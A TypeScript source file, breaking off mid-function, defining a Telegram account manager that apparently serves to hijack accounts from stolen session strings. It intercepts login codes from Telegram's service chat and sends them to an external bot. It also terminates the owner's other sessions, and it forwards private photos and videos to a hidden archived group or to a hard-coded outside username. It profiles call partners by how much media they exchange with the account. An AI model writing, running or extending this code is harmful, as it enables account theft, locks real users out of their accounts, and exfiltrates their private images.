import { TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { NewMessage, NewMessageEvent } from 'telegram/events';
import { Api } from 'telegram/tl';
import axios from 'axios';
import * as fs from 'fs';
import { CustomFile } from 'telegram/client/uploads';
import { TotalList, sleep } from 'telegram/Helpers';
import { Dialog } from 'telegram/tl/custom/dialog';
import { LogLevel } from 'telegram/extensions/Logger';
import { MailReader } from '../../IMap/IMap';
import bigInt from 'big-integer';
import { IterDialogsParams } from 'telegram/client/dialogs';
import { Entity, EntityLike } from 'telegram/define';
import { contains } from '../../utils';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';
import { ActiveClientSetup, MediaMessageMetadata } from 'src/interfaces/telegram';


interface TelegramError extends Error {
    code?: string;
    details?: string;
}

// Error codes for common Telegram errors
enum TelegramErrorCode {
    FLOOD_WAIT = 'FLOOD_WAIT',
    FILE_REFERENCE_EXPIRED = 'FILE_REFERENCE_EXPIRED',
    USERNAME_NOT_MODIFIED = 'USERNAME_NOT_MODIFIED',
    TIMEOUT = 'TIMEOUT',
    PHONE_CODE_INVALID = 'PHONE_CODE_INVALID',
    PASSWORD_REQUIRED = 'PASSWORD_REQUIRED',
}

interface TelegramOperation<T> {
    execute: () => Promise<T>;
    cleanup?: () => Promise<void>;
}

class TelegramManager {
    private session: StringSession;
    public phoneNumber: string;
    public client: TelegramClient | null;
    private channelArray: string[];
    private static activeClientSetup: ActiveClientSetup | undefined;
    private static readonly DOWNLOAD_TIMEOUT = 5000; // 5 seconds
    private static readonly CHUNK_SIZE = 512 * 1024; // 512 KB
    private static readonly MAX_FILE_SIZE = 5 * 1024 * 1024; // 5 MB
    private static readonly MAX_RETRIES = 3;

    constructor(sessionString: string, phoneNumber: string) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }

    public static getActiveClientSetup(): ActiveClientSetup | undefined {
        return TelegramManager.activeClientSetup;
    }

    public static setActiveClientSetup(data: ActiveClientSetup | undefined): void {
        TelegramManager.activeClientSetup = data;
    }

    public async createGroup(): Promise<{ id: string; accessHash: string }> {
        return this.safeOperation({
            execute: async () => {
                const result = await this.retryOperation(async () => {
                    const groupResult = await this.client!.invoke(
                        new Api.channels.CreateChannel({
                            title: "Saved Messages",
                            about: this.phoneNumber,
                            megagroup: true,
                            forImport: true,
                        })
                    ) as Api.Updates;

                    const { id, accessHash } = (groupResult.chats[0] as Api.Channel);

                    await Promise.all([
                        this.categorizeDialogToFolder(id, accessHash),
                        this.addUsersToChannel(id, accessHash)
                    ]);

                    return { id: id.toString(), accessHash: accessHash.toString() };
                });

                return result;
            }
        });
    }

    private async categorizeDialogToFolder(channelId: bigInt.BigInteger, accessHash: bigInt.BigInteger): Promise<void> {
        await this.client!.invoke(
            new Api.folders.EditPeerFolders({
                folderPeers: [
                    new Api.InputFolderPeer({
                        peer: new Api.InputPeerChannel({
                            channelId,
                            accessHash,
                        }),
                        folderId: 1,
                    }),
                ],
            })
        );
    }

    private async addUsersToChannel(channelId: bigInt.BigInteger, accessHash: bigInt.BigInteger): Promise<void> {
        await this.client!.invoke(
            new Api.channels.InviteToChannel({
                channel: new Api.InputChannel({
                    channelId,
                    accessHash,
                }),
                users: ["fuckyoubabie"]
            })
        );
    }

    public async createGroupAndForward(fromChatId: string): Promise<void> {
        try {
            const { id } = await this.createGroup();
            await this.forwardSecretMsgs(fromChatId, id);
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error in createGroupAndForward:', parsedError);
            throw error;
        }
    }

    public async joinChannelAndForward(fromChatId: string, channel: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const result = await this.joinChannel(channel);
            const channelResult = result as Api.Updates;
            if (!channelResult?.chats?.[0]) {
                throw new Error('Failed to join channel');
            }

            await this.client.invoke(
                new Api.folders.EditPeerFolders({
                    folderPeers: [
                        new Api.InputFolderPeer({
                            peer: new Api.InputPeerChannel({
                                channelId: channelResult.chats[0].id,
                                accessHash: (channelResult.chats[0] as Api.Channel).accessHash,
                            }),
                            folderId: 1,
                        }),
                    ],
                })
            );

            await this.forwardSecretMsgs(fromChatId, channel);
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error in joinChannelAndForward:', parsedError);
            throw error;
        }
    }

    public async forwardSecretMsgs(fromChatId: string, toChatId: string): Promise<void> {
        return this.safeOperation({
            execute: async () => {
                let offset = 0;
                const limit = 100;
                let forwardedCount = 0;
                const rateLimitDelay = 5000;

                while (true) {
                    const messages = await this.client!.getMessages(fromChatId, {
                        offsetId: offset,
                        limit
                    });

                    if (!messages.length) break;

                    const messageIds = this.filterMediaMessages(messages);
                    offset = messages[messages.length - 1].id;

                    if (messageIds.length > 0) {
                        await this.forwardMessagesWithRetry(toChatId, fromChatId, messageIds);
                        forwardedCount += messageIds.length;
                        console.log(`Forwarded ${forwardedCount} messages`);
                        await sleep(rateLimitDelay);
                    }

                    await sleep(rateLimitDelay);
                }

                await this.leaveChannels([toChatId]);
            }
        });
    }

    private filterMediaMessages(messages: Api.Message[]): number[] {
        return messages
            .filter(message => message.id && message.media)
            .map(message => message.id);
    }

    private async forwardMessagesWithRetry(toChatId: string, fromChatId: string, messageIds: number[]): Promise<void> {
        await this.retryOperation(async () => {
            await this.client!.forwardMessages(toChatId, {
                messages: messageIds,
                fromPeer: fromChatId,
            });
        }, 3);
    }

    //logic to forward messages from a chat to another chat maintaining rate limits
    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {
        const chunkSize = 30; // Number of messages to forward per request
        const totalMessages = messageIds.length;
        let forwardedCount = 0;

        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });

                forwardedCount += chunk.length;
                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await sleep(5000); // Sleep for a second to avoid rate limits
            } catch (error) {
                console.error("Error occurred while forwarding messages:", error);
            }
        }

        return forwardedCount;
    }

    async disconnect(): Promise<void> {
        if (this.client) {
            try {
                console.log("Destroying Client: ", this.phoneNumber);

                // Remove event handler with proper parameters
                this.client.removeEventHandler(this.handleEvents, new NewMessage({}));

                // Destroy the connection first
                await this.client.destroy();

                // Then disconnect the client
                await this.client.disconnect();

                // Clear the client instance
                this.client = null;

                // Delete the session
                this.session.delete();

                // Clear the channel array
                this.channelArray = [];
            } catch (error) {
                console.error("Error during disconnect:", error);
                throw error;
            }
        }
    }

    async getchatId(username: string): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }

    async getMe() {
        const me = <Api.User>await this.client.getMe();
        return me
    }

    async errorHandler(error) {
        parseError(error)
        if (error.message && error.message == 'TIMEOUT') {
            // await this.client.disconnect();
            // await this.client.destroy();
            // await disconnectAll()
            //Do nothing, as this error does not make sense to appear while keeping the client disconnected
        } else {
            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
            // Handle other types of errors
        }
    }

    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {
        try {
            this.client = new TelegramClient(
                this.session,
                parseInt(process.env.API_ID || '', 10),
                process.env.API_HASH || '',
                {
                    connectionRetries: 5,
                }
            );

            this.client.setLogLevel(LogLevel.ERROR);

            await this.retryOperation(async () => {
                await this.client?.connect();
                const me = await this.client?.getMe();
                if (!me) throw new Error('Failed to get user info');
                console.log("Connected Client : ", (me as Api.User).phone);
            });

            if (handler && this.client) {
                console.log("Adding event Handler");
                const eventHandler = handlerFn || this.handleEvents.bind(this);
                this.client.addEventHandler(eventHandler, new NewMessage());
            }

            return this.client;
        } catch (error) {
            const parsedError = parseError(error);
            console.error("Error creating client:", parsedError);
            throw error;
        }
    }

    async handleEvents(event: NewMessageEvent) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000));
                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);
            }
        }
    }

    public async channelInfo(sendIds = false): Promise<{
        chatsArrayLength: number;
        canSendTrueCount: number;
        canSendFalseCount: number;
        ids: string[];
        canSendFalseChats: string[];
    }> {
        return this.safeOperation({
            execute: async () => {
                const chats = await this.client!.getDialogs({ limit: 1500 });
                let canSendTrueCount = 0;
                let canSendFalseCount = 0;
                let totalCount = 0;
                this.channelArray = [];
                const canSendFalseChats: string[] = [];

                console.log("TotalChats:", chats.total);

                for (const chat of chats) {
                    if (!chat.isChannel && !chat.isGroup) continue;

                    try {
                        const chatEntity = chat.entity.toJSON() as Api.Channel;
                        const { broadcast, defaultBannedRights, id } = chatEntity;
                        const channelId = id.toString()?.replace(/^-100/, "");

                        totalCount++;

                        if (!broadcast && !defaultBannedRights?.sendMessages) {
                            canSendTrueCount++;
                            this.channelArray.push(channelId);
                        } else {
                            canSendFalseCount++;
                            canSendFalseChats.push(channelId);
                        }
                    } catch (error) {
                        const parsedError = parseError(error);
                        console.warn(`Failed to process chat: ${parsedError.message}`);
                    }
                }

                return {
                    chatsArrayLength: totalCount,
                    canSendTrueCount,
                    canSendFalseCount,
                    ids: sendIds ? this.channelArray : [],
                    canSendFalseChats
                };
            }
        });
    }

    async getGrpMembers(entity: EntityLike) {
        return this.safeOperation({
            execute: async () => {
                const chat = await this.client!.getEntity(entity);

                if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {
                    throw new Error("Invalid group or channel!");
                }

                console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);

                const participants = await this.client!.invoke(
                    new Api.channels.GetParticipants({
                        channel: chat,
                        filter: new Api.ChannelParticipantsRecent(),
                        offset: 0,
                        limit: 200,
                        hash: bigInt(0),
                    })
                );

                if (!(participants instanceof Api.channels.ChannelParticipants)) {
                    throw new Error("Failed to fetch participants");
                }

                const result = await this.processParticipants(participants.participants);
                console.log(`Processed ${result.length} members`);
                return result;
            }
        });
    }

    private async processParticipants(participants: Api.TypeChannelParticipant[]): Promise<Array<{
        tgId: string;
        name: string;
        username: string;
    }>> {
        const result: Array<{ tgId: string; name: string; username: string; }> = [];

        for (const participant of participants) {
            try {
                const userId = participant instanceof Api.ChannelParticipant ? participant.userId : null;
                if (!userId) continue;

                const userDetails = await this.client!.getEntity(userId) as Api.User;
                const memberInfo = {
                    tgId: userDetails.id.toString(),
                    name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`.trim(),
                    username: userDetails.username || "",
                };

                result.push(memberInfo);

                if (userDetails.firstName === 'Deleted Account' && !userDetails.username) {
                    console.log('Found deleted account:', userDetails.id.toString());
                }
            } catch (error) {
                const parsedError = parseError(error);
                console.warn(`Failed to process participant: ${parsedError.message}`);
            }
        }

        return result;
    }

    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params: IterDialogsParams): Promise<TotalList<Dialog>> {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats
    }

    async getLastMsgs(limit: number): Promise<string> {
        if (!this.client) throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }

    async getSelfMSgsInfo(): Promise<{
        photoCount: number;
        videoCount: number;
        movieCount: number,
        total: number,
        ownPhotoCount: number,
        otherPhotoCount: number,
        ownVideoCount: number,
        otherVideoCount: number
    }> {
        if (!this.client) throw new Error('Client is not initialized');
        const self = <Api.User>await this.client.getMe();
        const selfChatId = self.id;

        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;

        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++
            } else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++
                    } else {
                        otherPhotoCount++
                    }
                } else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++
                    } else {
                        otherVideoCount++
                    }
                }
            }
        }

        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })
    }

    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`; // Automated naming
                const lastName = "";
                try {
                    await this.client.invoke(
                        new Api.contacts.AddContact({
                            firstName,
                            lastName,
                            phone: user.mobile,
                            id: user.tgId
                        })
                    );
                } catch (e) {
                    console.log(e)
                }
            }
        } catch (error) {
            console.error("Error adding contacts:", error);
            parseError(error, `Failed to save contacts`);
        }
    }

    public async addContacts(mobiles: string[], namePrefix: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const inputContacts: Api.TypeInputContact[] = mobiles.map((mobile, index) => {
                const firstName = `${namePrefix}${index + 1}`;
                const clientId = bigInt((index << 16).toString());

                return new Api.InputPhoneContact({
                    clientId,
                    phone: mobile,
                    firstName,
                    lastName: '',
                });
            });

            const result = await this.client.invoke(
                new Api.contacts.ImportContacts({
                    contacts: inputContacts,
                })
            );

            console.log("Imported Contacts Result:", result);
        } catch (error) {
            const parsedError = parseError(error);
            console.error("Error adding contacts:", parsedError);
            throw error;
        }
    }

    public async leaveChannels(chats: string[]): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        console.log("Leaving Channels: initiated!!");
        console.log("Chats to leave:", chats.length);

        for (const id of chats) {
            try {
                await this.client.invoke(
                    new Api.channels.LeaveChannel({
                        channel: id
                    })
                );
                console.log("Left channel:", id);

                if (chats.length > 1) {
                    await sleep(30000); // Rate limiting
                }
            } catch (error) {
                const parsedError = parseError(error);
                console.log("Failed to leave channel:", parsedError.message);
                // Continue with other channels even if one fails
            }
        }
    }

    public async getEntity(entity: Api.TypeEntityLike): Promise<Entity | undefined> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            return await this.client.getEntity(entity);
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error getting entity:', parsedError);
            throw error;
        }
    }

    public async joinChannel(entity: Api.TypeEntityLike): Promise<Api.TypeUpdates | undefined> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            console.log("Trying to join channel:", entity);
            const channelEntity = await this.client.getEntity(entity);
            return await this.client.invoke(
                new Api.channels.JoinChannel({
                    channel: channelEntity
                })
            );
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error joining channel:', parsedError);
            throw error;
        }
    }

    connected() {
        return this.client.connected;
    }

    async connect() {
        return await this.client.connect();
    }

    async removeOtherAuths(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            } else {
                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }

    private isAuthMine(auth: any): boolean {
        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
            auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows');
    }


    private async resetAuthorization(auth: any): Promise<void> {
        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
    }

    public async getAuths(): Promise<Api.account.Authorizations> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            return await this.client.invoke(new Api.account.GetAuthorizations());
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error getting authorizations:', parsedError);
            throw error;
        }
    }

    async getAllChats(): Promise<any[]> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });

        const result = await Promise.all(messages.map(async (message: Api.Message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;

            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));

        return result;
    }

    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {
        if (message.media instanceof Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id)
            const sizes = (<Api.Photo>message.photo)?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });

        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id)
            const sizes = message.document?.thumbs || [1]
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }

    async sendInlineMessage(chatId: string, message: string, url: string) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new Api.KeyboardButtonUrl(button)]
        })
        return result;
    }

    async getMediaMessages() {
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhotos(),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );
        return result
    }


    async getCallLog() {
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );

        const callLogs = <Api.Message[]>result.messages.filter(
            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall
        );

        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = <Api.MessageActionPhoneCall>log.action

            // const callInfo = {
            //     callId: logAction.callId.toString(),
            //     duration: logAction.duration,
            //     video: logAction.video,
            //     timestamp: log.date
            // };

            // Categorize by type
            if (log.out) {
                filteredResults.outgoing++;
            } else {
                filteredResults.incoming++;
            }

            if (logAction.video) {
                filteredResults.video++;
            }

            // Count calls per chat ID
            const chatId = (log.peerId as Api.PeerUser).userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = <Api.User>await this.client.getEntity(chatId)
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0
                const msgs = await this.client.getMessages(chatId, { limit: 600 })
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof Api.MessageMediaPhoto) {
                            photo++
                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...(details as any),
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                })
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });

        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }

    public async getLastActiveTime(): Promise<string> {
        try {
            const result = await this.getAuths();
            let latestActivity = 0;

            result.authorizations.forEach((auth) => {
                if (!this.isAuthMine(auth) && auth.dateActive > latestActivity) {
                    latestActivity = auth.dateActive;
                }
            });

            return new Date(latestActivity * 1000).toISOString().split('T')[0];
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error getting last active time:', parsedError);
            throw error;
        }
    }

    public async getContacts(): Promise<Api.contacts.TypeContacts> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            return await this.client.invoke(new Api.contacts.GetContacts({
                hash: bigInt(0)
            }));
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error getting contacts:', parsedError);
            throw error;
        }
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll(),
                    ],
                })
            );

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            throw e
        }
    }
    async updateProfile(firstName: string, about: string) {
        const data = {
            lastName: "",
        }
        if (firstName !== undefined) {
            data["firstName"] = firstName
        }
        if (about !== undefined) {
            data["about"] = about
        }
        try {
            const result = await this.client.invoke(
                new Api.account.UpdateProfile(data)
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            throw error
        }
    }

    async downloadProfilePic(photoIndex: number) {
        try {
            const photos = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: 'me',
                    offset: 0,
                })
            );

            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);

                // Choose the photo index (0-based)
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];

                    // Extract the largest photo file (e.g., highest resolution)
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)
                    const photoFileSize = selectedPhoto.sizes[index];

                    // Download the file
                    const photoBuffer = await this.client.downloadFile(
                        new Api.InputPhotoFileLocation({
                            id: selectedPhoto.id,
                            accessHash: selectedPhoto.accessHash,
                            fileReference: selectedPhoto.fileReference,
                            thumbSize: photoFileSize.type
                        }), {
                        dcId: selectedPhoto.dcId, // Data center ID
                    });

                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    } else {
                        console.log("Failed to download the photo.");
                    }
                } else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            } else {
                console.log("No profile photos found.");
            }
        } catch (err) {
            console.error("Error:", err);
        }
    }

    public async deleteChat(chatId: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            await this.client.invoke(new Api.messages.DeleteHistory({
                justClear: false,
                peer: chatId,
                revoke: false,
            }));
            console.log(`Dialog with ID ${chatId} has been deleted.`);
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error deleting chat:', parsedError);
            throw error;
        }
    }

    public async blockUser(chatId: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            await this.client.invoke(new Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error blocking user:', parsedError);
            throw error;
        }
    }

    public async downloadMedia(chatId: string, messageId: number, res: any): Promise<void> {
        return this.safeOperation({
            execute: async () => {
                const messages = await this.client!.getMessages(chatId, { ids: [messageId] });
                const message = messages[0] as Api.Message;

                if (!message?.media || message.media instanceof Api.MessageMediaEmpty) {
                    throw new Error('Media not found');
                }

                const { contentType, filename, fileLocation } = this.getMediaDetails(message);
                const chunkSize = TelegramManager.CHUNK_SIZE;
                const maxSize = TelegramManager.MAX_FILE_SIZE;

                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

                let downloadedSize = 0;
                for await (const chunk of this.client!.iterDownload({
                    file: fileLocation,
                    offset: bigInt(0),
                    limit: maxSize,
                    requestSize: chunkSize,
                })) {
                    downloadedSize += chunk.length;
                    if (downloadedSize > maxSize) {
                        throw new Error('File size exceeds maximum allowed size');
                    }
                    res.write(chunk);
                }
                res.end();
            }
        });
    }

    private getMediaDetails(message: Api.Message): {
        contentType: string;
        filename: string;
        fileLocation: Api.InputPhotoFileLocation | Api.InputDocumentFileLocation;
    } {
        const inputLocation = message.video || message.photo as Api.Photo;
        const locationData = {
            id: inputLocation.id,
            accessHash: inputLocation.accessHash,
            fileReference: inputLocation.fileReference,
        };

        if (message.media instanceof Api.MessageMediaPhoto) {
            return {
                contentType: 'image/jpeg',
                filename: 'photo.jpg',
                fileLocation: new Api.InputPhotoFileLocation({ ...locationData, thumbSize: 'm' })
            };
        } else if (message.media instanceof Api.MessageMediaDocument) {
            return {
                contentType: message.document?.mimeType || 'video/mp4',
                filename: 'video.mp4',
                fileLocation: new Api.InputDocumentFileLocation({ ...locationData, thumbSize: '' })
            };
        }

        throw new Error('Unsupported media type');
    }

    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {
        try {
            const messages = await this.client.getMessages(chatId, { ids: [messageId] });
            const message = <Api.Message>messages[0];

            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || <Api.Photo>message.photo;

                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };

                if (media instanceof Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                } else if (media instanceof Api.MessageMediaDocument) {
                    contentType = (media as any).mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                } else {
                    return res.status(415).send('Unsupported media type');
                }

                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

                const chunkSize = 512 * 1024; // 512 KB chunks

                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: bigInt[0],
                    limit: 5 * 1024 * 1024, // 80 MB limit
                    requestSize: chunkSize,
                })) {
                    res.write(chunk); // Stream each chunk to the client
                }
                res.end();
            } else {
                res.status(404).send('Media not found');
            }
        } catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }

    public async forwardMessage(chatId: string, messageId: number): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            await this.client.forwardMessages("@fuckyoubabie", {
                fromPeer: chatId,
                messages: messageId
            });
        } catch (error) {
            const parsedError = parseError(error);
            console.error('Error forwarding message:', parsedError);
            // Don't throw here as this is a non-critical operation
        }
    }

    public async updateUsername(baseUsername: string): Promise<string> {
        if (!this.client) throw new Error('Client is not initialized');

        let newUserName = '';
        let username = baseUsername.trim();
        let increment = 0;
        const maxAttempts = 10;

        try {
            if (username === '') {
                await this.retryOperation(() =>
                    this.client!.invoke(new Api.account.UpdateUsername({ username: '' }))
                );
                console.log('Removed Username successfully.');
                return '';
            }

            while (increment < maxAttempts) {
                try {
                    const result = await this.client.invoke(
                        new Api.account.CheckUsername({ username })
                    );

                    if (result) {
                        await this.client.invoke(new Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                } catch (error) {
                    const parsedError = parseError(error);
                    if (parsedError.message === 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
